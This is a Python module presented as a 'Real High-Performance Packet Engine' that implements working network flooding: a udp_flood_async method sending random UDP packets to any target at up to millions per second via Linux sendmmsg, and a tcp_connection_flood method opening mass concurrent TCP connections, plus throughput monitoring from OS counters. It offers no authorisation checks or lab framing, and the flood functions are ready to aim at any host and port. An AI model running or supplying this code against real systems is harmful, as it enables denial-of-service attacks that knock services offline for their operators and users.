#!/usr/bin/env python3
"""
Real High-Performance Packet Engine

This module provides ACTUAL high-performance packet generation.
Every packet is really sent - no simulations, no fake counters.

What this module ACTUALLY does:
- Sends real UDP packets using socket.sendto()
- Sends real TCP connections using asyncio
- Uses sendmmsg() on Linux for batch UDP sending (requires root)
- Uses IOCP on Windows via asyncio ProactorEventLoop
- Measures real throughput from OS counters
- Verifies socket optimizations via getsockopt()

Performance expectations (honest):
- UDP on Linux with sendmmsg(): 500K-2M PPS depending on hardware
- UDP on Windows: 50K-200K PPS (Windows networking stack overhead)
- TCP connections: 10K-50K connections/sec depending on target
- Bandwidth: 1-10 Gbps depending on NIC and CPU
"""

import os
import sys
import socket
import asyncio
import platform
import logging
import time
import ctypes
import struct
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger(__name__)

# Platform-specific constants
PLATFORM = platform.system()

# TCP_QUICKACK is Linux-specific (constant value 12)
TCP_QUICKACK = 12 if PLATFORM == 'Linux' else None

# Default socket buffer sizes
DEFAULT_SNDBUF = 16 * 1024 * 1024  # 16MB
DEFAULT_RCVBUF = 16 * 1024 * 1024  # 16MB
TCP_BUFFER_SIZE = 1024 * 1024  # 1MB for TCP


@dataclass
class SocketOptimizationResult:
    """Result of socket optimization attempt with verification"""
    option_name: str
    requested_value: int
    actual_value: int
    success: bool
    error_message: Optional[str] = None
    
    @property
    def was_applied(self) -> bool:
        """Check if optimization was actually applied (actual > default)"""
        return self.success and self.actual_value > 0


@dataclass
class PacketStats:
    """Real packet statistics from actual sends"""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: float = 0.0
    
    @property
    def elapsed(self) -> float:
        return time.perf_counter() - self.start_time if self.start_time else 0.0
    
    @property
    def pps(self) -> float:
        """Packets per second"""
        return self.packets_sent / self.elapsed if self.elapsed > 0 else 0.0
    
    @property
    def mbps(self) -> float:
        """Megabits per second"""
        return (self.bytes_sent * 8 / 1_000_000) / self.elapsed if self.elapsed > 0 else 0.0
    
    @property
    def gbps(self) -> float:
        """Gigabits per second"""
        return (self.bytes_sent * 8 / 1_000_000_000) / self.elapsed if self.elapsed > 0 else 0.0


class RealPacketEngine:
    """
    High-performance packet engine using actual system calls.
    
    This class sends REAL packets - every call results in actual
    network traffic. No simulations.
    
    Socket optimizations are applied and VERIFIED via getsockopt().
    """
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.platform = platform.system()
        self.stats = PacketStats()
        self.optimization_results: List[SocketOptimizationResult] = []
        
        # Platform-specific capabilities
        self.sendmmsg_available = self._check_sendmmsg()
        self.is_root = self._check_root()
        
        logger.info(f"Packet engine initialized: target={target}:{port}, "
                   f"platform={self.platform}, sendmmsg={self.sendmmsg_available}, "
                   f"is_root={self.is_root}")
    
    def _check_root(self) -> bool:
        """Check if running with root/admin privileges"""
        if self.platform == 'Windows':
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except Exception:
                return False
        else:
            return os.geteuid() == 0
    
    def _check_sendmmsg(self) -> bool:
        """Check if sendmmsg() is available"""
        if self.platform != 'Linux':
            return False
        try:
            libc = ctypes.CDLL('libc.so.6', use_errno=True)
            return hasattr(libc, 'sendmmsg')
        except Exception:
            return False
    
    def _apply_socket_option(self, sock: socket.socket, level: int, 
                             option: int, value: int, 
                             option_name: str) -> SocketOptimizationResult:
        """
        Apply a socket option and verify it was accepted via getsockopt().
        
        Returns SocketOptimizationResult with actual value from kernel.
        """
        try:
            sock.setsockopt(level, option, value)
            actual = sock.getsockopt(level, option)
            success = True
            error_msg = None
            logger.info(f"{option_name}: requested {value}, kernel accepted {actual}")
        except OSError as e:
            actual = 0
            success = False
            error_msg = str(e)
            logger.warning(f"Could not set {option_name}: {e}")
        
        result = SocketOptimizationResult(
            option_name=option_name,
            requested_value=value,
            actual_value=actual,
            success=success,
            error_message=error_msg
        )
        self.optimization_results.append(result)
        return result
    
    def create_udp_socket(self) -> socket.socket:
        """
        Create an optimized UDP socket.
        
        Applies real socket options and VERIFIES they were accepted
        by reading back values via getsockopt().
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Set non-blocking for async operations
        sock.setblocking(False)
        
        # Optimize send buffer - request large buffer, verify what kernel accepts
        self._apply_socket_option(
            sock, socket.SOL_SOCKET, socket.SO_SNDBUF, 
            DEFAULT_SNDBUF, "UDP SO_SNDBUF"
        )
        
        # Optimize receive buffer
        self._apply_socket_option(
            sock, socket.SOL_SOCKET, socket.SO_RCVBUF,
            DEFAULT_RCVBUF, "UDP SO_RCVBUF"
        )
        
        # Enable address reuse
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        return sock
    
    def create_tcp_socket(self) -> socket.socket:
        """
        Create an optimized TCP socket with verified optimizations.
        
        Applies and verifies:
        - SO_SNDBUF, SO_RCVBUF for buffer sizes
        - TCP_NODELAY to disable Nagle's algorithm
        - TCP_QUICKACK (Linux only) for immediate ACKs
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        
        # Enable address reuse
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Buffer optimizations with verification
        self._apply_socket_option(
            sock, socket.SOL_SOCKET, socket.SO_SNDBUF,
            TCP_BUFFER_SIZE, "TCP SO_SNDBUF"
        )
        self._apply_socket_option(
            sock, socket.SOL_SOCKET, socket.SO_RCVBUF,
            TCP_BUFFER_SIZE, "TCP SO_RCVBUF"
        )
        
        # TCP_NODELAY - disable Nagle's algorithm for low latency
        self._apply_socket_option(
            sock, socket.IPPROTO_TCP, socket.TCP_NODELAY,
            1, "TCP_NODELAY"
        )
        
        # TCP_QUICKACK - Linux only, send ACKs immediately
        if TCP_QUICKACK is not None:
            self._apply_socket_option(
                sock, socket.IPPROTO_TCP, TCP_QUICKACK,
                1, "TCP_QUICKACK"
            )
        
        return sock
    
    def get_socket_optimization_status(self) -> Dict[str, Any]:
        """
        Get status of all socket optimizations applied.
        
        Returns dict with optimization results for verification.
        """
        return {
            'platform': self.platform,
            'is_root': self.is_root,
            'optimizations': [
                {
                    'name': r.option_name,
                    'requested': r.requested_value,
                    'actual': r.actual_value,
                    'success': r.success,
                    'error': r.error_message
                }
                for r in self.optimization_results
            ],
            'sendmmsg_available': self.sendmmsg_available
        }
    
    def verify_socket_optimizations(self, sock: socket.socket) -> Dict[str, int]:
        """
        Verify current socket buffer sizes via getsockopt().
        
        Returns dict with actual kernel values.
        """
        result = {}
        try:
            result['SO_SNDBUF'] = sock.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
        except OSError:
            result['SO_SNDBUF'] = 0
        
        try:
            result['SO_RCVBUF'] = sock.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)
        except OSError:
            result['SO_RCVBUF'] = 0
        
        # Check TCP options if it's a TCP socket
        try:
            result['TCP_NODELAY'] = sock.getsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY)
        except OSError:
            pass  # Not a TCP socket
        
        if TCP_QUICKACK is not None:
            try:
                result['TCP_QUICKACK'] = sock.getsockopt(socket.IPPROTO_TCP, TCP_QUICKACK)
            except OSError:
                pass
        
        return result
    
    def send_udp_packet(self, sock: socket.socket, data: bytes) -> bool:
        """
        Send a single UDP packet - REAL send.
        
        Returns True if sent, False if would block or error.
        """
        try:
            sock.sendto(data, (self.target, self.port))
            self.stats.packets_sent += 1
            self.stats.bytes_sent += len(data)
            return True
        except BlockingIOError:
            return False
        except OSError as e:
            self.stats.errors += 1
            if e.errno not in (10055, 11):  # WSAENOBUFS, EAGAIN
                logger.debug(f"UDP send error: {e}")
            return False
    
    def send_udp_batch(self, sock: socket.socket, packets: List[bytes]) -> int:
        """
        Send multiple UDP packets efficiently.
        
        On Linux with root, uses sendmmsg() for batch sending.
        Otherwise falls back to individual sendto() calls.
        
        Returns number of packets sent.
        """
        if self.sendmmsg_available and self.is_root:
            return self._sendmmsg_batch(sock, packets)
        else:
            return self._sendto_batch(sock, packets)
    
    def _sendmmsg_batch(self, sock: socket.socket, packets: List[bytes]) -> int:
        """
        Use Linux sendmmsg() for efficient batch sending.
        
        sendmmsg() sends multiple messages in a single system call,
        reducing syscall overhead significantly.
        
        This is a REAL implementation using ctypes to call libc sendmmsg().
        Falls back to regular sendto() loop on non-Linux platforms or on error.
        """
        if self.platform != 'Linux':
            logger.debug("sendmmsg not available on this platform, using fallback")
            return self._sendto_batch(sock, packets)
        
        try:
            libc = ctypes.CDLL('libc.so.6', use_errno=True)
            
            # Define structures for sendmmsg (Linux-specific)
            class sockaddr_in(ctypes.Structure):
                _fields_ = [
                    ('sin_family', ctypes.c_ushort),
                    ('sin_port', ctypes.c_ushort),
                    ('sin_addr', ctypes.c_uint32),
                    ('sin_zero', ctypes.c_char * 8)
                ]
            
            class iovec(ctypes.Structure):
                _fields_ = [
                    ('iov_base', ctypes.c_void_p),
                    ('iov_len', ctypes.c_size_t)
                ]
            
            class msghdr(ctypes.Structure):
                _fields_ = [
                    ('msg_name', ctypes.c_void_p),
                    ('msg_namelen', ctypes.c_uint32),
                    ('msg_iov', ctypes.POINTER(iovec)),
                    ('msg_iovlen', ctypes.c_size_t),
                    ('msg_control', ctypes.c_void_p),
                    ('msg_controllen', ctypes.c_size_t),
                    ('msg_flags', ctypes.c_int)
                ]
            
            class mmsghdr(ctypes.Structure):
                _fields_ = [
                    ('msg_hdr', msghdr),
                    ('msg_len', ctypes.c_uint)
                ]
            
            # Prepare destination address
            addr = sockaddr_in()
            addr.sin_family = socket.AF_INET
            addr.sin_port = socket.htons(self.port)
            addr.sin_addr = struct.unpack('!I', socket.inet_aton(self.target))[0]
            
            # Prepare message array
            num_packets = len(packets)
            msgs = (mmsghdr * num_packets)()
            iovecs = (iovec * num_packets)()
            
            # Keep references to ctypes buffers to prevent garbage collection
            buffers = []
            
            for i, pkt in enumerate(packets):
                # Create a ctypes buffer from the bytes data
                buf = ctypes.create_string_buffer(pkt, len(pkt))
                buffers.append(buf)  # Keep reference
                
                iovecs[i].iov_base = ctypes.cast(buf, ctypes.c_void_p)
                iovecs[i].iov_len = len(pkt)
                
                msgs[i].msg_hdr.msg_name = ctypes.addressof(addr)
                msgs[i].msg_hdr.msg_namelen = ctypes.sizeof(addr)
                msgs[i].msg_hdr.msg_iov = ctypes.pointer(iovecs[i])
                msgs[i].msg_hdr.msg_iovlen = 1
                msgs[i].msg_hdr.msg_control = None
                msgs[i].msg_hdr.msg_controllen = 0
                msgs[i].msg_hdr.msg_flags = 0
            
            # Call sendmmsg - this is the REAL system call
            sent = libc.sendmmsg(sock.fileno(), msgs, num_packets, 0)
            
            if sent > 0:
                total_bytes = sum(len(packets[i]) for i in range(sent))
                self.stats.packets_sent += sent
                self.stats.bytes_sent += total_bytes
                logger.debug(f"sendmmsg sent {sent}/{num_packets} packets")
                return sent
            elif sent == 0:
                logger.debug("sendmmsg returned 0 - no packets sent")
                return 0
            else:
                # Error occurred
                errno = ctypes.get_errno()
                logger.warning(f"sendmmsg returned {sent}, errno={errno}")
                return 0
                
        except OSError as e:
            logger.warning(f"sendmmsg OSError: {e}, falling back to sendto")
            return self._sendto_batch(sock, packets)
        except Exception as e:
            logger.warning(f"sendmmsg failed: {e}, falling back to sendto")
            return self._sendto_batch(sock, packets)
    
    def _sendto_batch(self, sock: socket.socket, packets: List[bytes]) -> int:
        """
        Fallback batch send using individual sendto() calls.
        """
        sent = 0
        for pkt in packets:
            if self.send_udp_packet(sock, pkt):
                sent += 1
            else:
                break  # Buffer full, stop
        return sent
    
    async def udp_flood_async(self, packet_size: int = 1400, 
                              duration: float = 10.0,
                              rate_limit: Optional[int] = None) -> PacketStats:
        """
        Async UDP flood - sends real packets as fast as possible.
        
        Args:
            packet_size: Size of each UDP packet
            duration: How long to run (seconds)
            rate_limit: Optional packets per second limit
            
        Returns:
            PacketStats with real measurements
        """
        self.stats = PacketStats(start_time=time.perf_counter())
        sock = self.create_udp_socket()
        
        # Pre-generate packet data
        packet_data = os.urandom(packet_size)
        
        # Calculate timing for rate limiting
        if rate_limit:
            interval = 1.0 / rate_limit
        else:
            interval = 0  # No limit
        
        end_time = time.perf_counter() + duration
        last_send = time.perf_counter()
        
        try:
            while time.perf_counter() < end_time:
                now = time.perf_counter()
                
                # Rate limiting
                if rate_limit and (now - last_send) < interval:
                    await asyncio.sleep(0)
                    continue
                
                # Send packet
                if self.send_udp_packet(sock, packet_data):
                    last_send = now
                else:
                    # Buffer full, yield to let it drain
                    await asyncio.sleep(0.001)
                
                # Yield periodically to keep event loop responsive
                if self.stats.packets_sent % 1000 == 0:
                    await asyncio.sleep(0)
                    
        finally:
            sock.close()
        
        logger.info(f"UDP flood complete: {self.stats.packets_sent} packets, "
                   f"{self.stats.pps:.0f} PPS, {self.stats.mbps:.2f} Mbps")
        
        return self.stats
    
    async def tcp_connection_flood(self, duration: float = 10.0,
                                   max_concurrent: int = 100) -> PacketStats:
        """
        TCP connection flood - creates real TCP connections.
        
        This creates actual TCP connections to the target.
        Each connection goes through the full TCP handshake.
        """
        self.stats = PacketStats(start_time=time.perf_counter())
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def connect_once():
            async with semaphore:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target, self.port),
                        timeout=5.0
                    )
                    self.stats.packets_sent += 1  # Count successful connections
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    self.stats.errors += 1
        
        end_time = time.perf_counter() + duration
        tasks = []
        
        while time.perf_counter() < end_time:
            task = asyncio.create_task(connect_once())
            tasks.append(task)
            
            # Limit task accumulation
            if len(tasks) >= max_concurrent * 2:
                done, tasks = await asyncio.wait(
                    tasks, 
                    timeout=0.1,
                    return_when=asyncio.FIRST_COMPLETED
                )
                tasks = list(tasks)
            
            await asyncio.sleep(0)
        
        # Wait for remaining tasks
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        logger.info(f"TCP flood complete: {self.stats.packets_sent} connections, "
                   f"{self.stats.pps:.0f} conn/sec")
        
        return self.stats


class RealPerformanceMonitor:
    """
    Monitor real performance using OS-level counters.
    
    This reads actual packet/byte counts from the operating system,
    not internal estimates.
    """
    
    def __init__(self, interface: Optional[str] = None):
        self.platform = platform.system()
        self.interface = interface or self._detect_interface()
        self._baseline = None
    
    def _detect_interface(self) -> str:
        """Detect the default network interface"""
        if self.platform == 'Linux':
            try:
                # Get interface with default route
                import subprocess
                result = subprocess.run(
                    ['ip', 'route', 'get', '8.8.8.8'],
                    capture_output=True, text=True
                )
                for word in result.stdout.split():
                    if word.startswith('eth') or word.startswith('en') or word.startswith('wl'):
                        return word
            except Exception:
                pass
            return 'eth0'
        elif self.platform == 'Windows':
            return 'Ethernet'
        else:
            return 'en0'
    
    def get_interface_stats(self) -> Dict[str, int]:
        """
        Get REAL interface statistics from the OS.
        """
        if self.platform == 'Linux':
            return self._get_linux_stats()
        else:
            return self._get_psutil_stats()
    
    def _get_linux_stats(self) -> Dict[str, int]:
        """Read from /proc/net/dev - real kernel counters"""
        stats = {'tx_packets': 0, 'tx_bytes': 0, 'rx_packets': 0, 'rx_bytes': 0}
        
        try:
            with open('/proc/net/dev', 'r') as f:
                for line in f:
                    if self.interface in line:
                        parts = line.split()
                        # Format: iface: rx_bytes rx_packets ... tx_bytes tx_packets
                        stats['rx_bytes'] = int(parts[1])
                        stats['rx_packets'] = int(parts[2])
                        stats['tx_bytes'] = int(parts[9])
                        stats['tx_packets'] = int(parts[10])
                        break
        except Exception as e:
            logger.error(f"Failed to read /proc/net/dev: {e}")
        
        return stats
    
    def _get_psutil_stats(self) -> Dict[str, int]:
        """Fallback using psutil"""
        try:
            import psutil
            counters = psutil.net_io_counters(pernic=True)
            if self.interface in counters:
                c = counters[self.interface]
                return {
                    'tx_packets': c.packets_sent,
                    'tx_bytes': c.bytes_sent,
                    'rx_packets': c.packets_recv,
                    'rx_bytes': c.bytes_recv
                }
        except Exception as e:
            logger.error(f"psutil stats failed: {e}")
        
        return {'tx_packets': 0, 'tx_bytes': 0, 'rx_packets': 0, 'rx_bytes': 0}
    
    def start_measurement(self):
        """Start a measurement period"""
        self._baseline = self.get_interface_stats()
        self._start_time = time.perf_counter()
    
    def get_measurement(self) -> Dict[str, Any]:
        """Get real performance since start_measurement()"""
        if not self._baseline:
            return {}
        
        current = self.get_interface_stats()
        elapsed = time.perf_counter() - self._start_time
        
        tx_packets = current['tx_packets'] - self._baseline['tx_packets']
        tx_bytes = current['tx_bytes'] - self._baseline['tx_bytes']
        
        return {
            'elapsed_seconds': elapsed,
            'packets_sent': tx_packets,
            'bytes_sent': tx_bytes,
            'pps': tx_packets / elapsed if elapsed > 0 else 0,
            'mbps': (tx_bytes * 8 / 1_000_000) / elapsed if elapsed > 0 else 0,
            'gbps': (tx_bytes * 8 / 1_000_000_000) / elapsed if elapsed > 0 else 0,
            'interface': self.interface,
            'source': 'os_counters'
        }


def create_engine(target: str, port: int) -> RealPacketEngine:
    """Factory function to create packet engine"""
    return RealPacketEngine(target, port)
